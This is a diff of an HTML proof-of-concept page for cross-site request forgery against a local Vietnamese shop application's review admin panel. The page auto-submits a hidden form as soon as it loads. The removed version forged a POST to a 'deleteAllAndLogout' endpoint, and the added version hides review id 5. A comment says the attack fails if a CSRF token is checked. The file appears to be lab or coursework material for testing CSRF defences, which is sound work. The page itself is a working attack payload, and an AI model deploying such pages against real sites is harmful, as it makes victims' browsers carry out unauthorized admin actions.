@@ -3,23 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <title>Đang xử lý...</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 100px;
-    }
-    .hidden-form {
-      display: none;
-    }
-  </style>
 </head>
-<body onload="document.getElementById('csrf-attack-form').submit()">
-  <h2>Đang xử lý yêu cầu... Vui lòng chờ</h2>
+<body onload="document.getElementById('csrfForm').submit()">
+  <h2>Đang xử lý đánh giá...</h2>
 
-  <!-- Form giả mạo gửi POST tới server của nạn nhân -->
-  <form id="csrf-attack-form" class="hidden-form" method="POST" action="http://localhost:8080/WebDoChoi/admin/reviewManager/deleteAllAndLogout">
-    <!-- Nếu servlet yêu cầu csrfToken thì tấn công sẽ thất bại -->
+  <form id="csrfForm" action="http://localhost:8080/WebDoChoi/admin/reviewManager/update" method="post" style="display: none;">
+    <input type="hidden" name="id" value="5">
+    <input type="hidden" name="action" value="HIDE">
   </form>
 </body>
 </html>
